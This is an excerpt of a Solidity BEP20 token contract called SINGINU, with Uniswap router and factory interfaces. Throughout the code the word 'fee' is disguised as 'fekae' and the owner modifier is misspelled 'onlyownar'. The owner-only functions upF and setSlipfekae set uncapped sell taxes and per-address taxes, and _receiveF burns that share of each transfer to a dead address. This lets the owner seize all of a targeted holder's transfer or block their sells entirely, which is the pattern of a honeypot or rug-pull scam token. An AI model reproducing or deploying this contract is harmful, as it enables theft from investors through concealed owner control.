...
interface IUniswapV2Factory {
    ...
    function fekaeTo() external view returns (address);
    function fekaeToSetter() external view returns (address);
    ...
    function setfekaeTo(address) external;
    function setfekaeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfekaeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfekaeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfekaeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfekaeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfekaeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract SINGINU is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfekae = 0;

    uint256 private _defaultBuyfekae = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfekae;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfekae = _value;
    }

    function setSlipfekae(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfekae[_address] = _value;
    }

    function getSlipfekae(address _address) external view onlyownar returns (uint256) {
        return _slipfekae[_address];
    }


    function setMAccountfekae(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfekae(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefekaeAmount = 0;

        if (rF) {
            uint256 tradefekae = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefekae = _defaultSellfekae;
                }
                if (from == uniswapV2Pair) {

                    tradefekae = _defaultBuyfekae;
                }
            }
            if (_slipfekae[from] > 0) {
                tradefekae = _slipfekae[from];
            }

            tradefekaeAmount = _Amount.mul(tradefekae).div(100);
        }


        if (tradefekaeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefekaeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefekaeAmount);
            emit Transfer(from, _deadAddress, tradefekaeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefekaeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefekaeAmount);
        emit Transfer(from, _to, _Amount - tradefekaeAmount);
    }
